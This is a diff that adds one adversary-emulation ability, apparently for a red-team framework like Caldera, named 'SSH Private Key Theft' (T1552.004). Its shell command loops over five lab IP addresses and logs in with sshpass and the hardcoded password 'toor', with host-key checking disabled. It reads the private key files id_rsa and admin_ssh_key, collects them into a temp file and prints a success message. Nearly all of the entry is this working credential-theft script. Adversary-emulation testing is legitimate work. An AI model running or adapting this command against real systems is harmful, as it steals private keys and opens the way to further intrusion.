@@ -1,0 +1,16 @@
+- id: ca04-ssh-key-theft
+  name: SSH Private Key Theft
+  description: Steal SSH private keys from all compromised hosts
+  tactic: credential-access
+  technique:
+    attack_id: T1552.004
+    name: Unsecured Credentials - Private Keys
+  platforms:
+    linux:
+      sh:
+        command: |
+          for h in 10.0.20.10 10.0.20.21 10.0.20.30 10.0.20.40 10.0.20.200; do sshpass -p 'toor' ssh -o StrictHostKeyChecking=no labuser@$h 'cat /home/ansible/.ssh/id_rsa /tmp/admin_ssh_key 2>/dev/null' 2>/dev/null; done > /tmp/ssh_keys.txt; grep -c 'BEGIN' /tmp/ssh_keys.txt 2>/dev/null && echo '[+] SSH keys collected'
+        cleanup: |
+          rm -f /tmp/ssh_keys.txt
+  singleton: false
+  repeatable: false
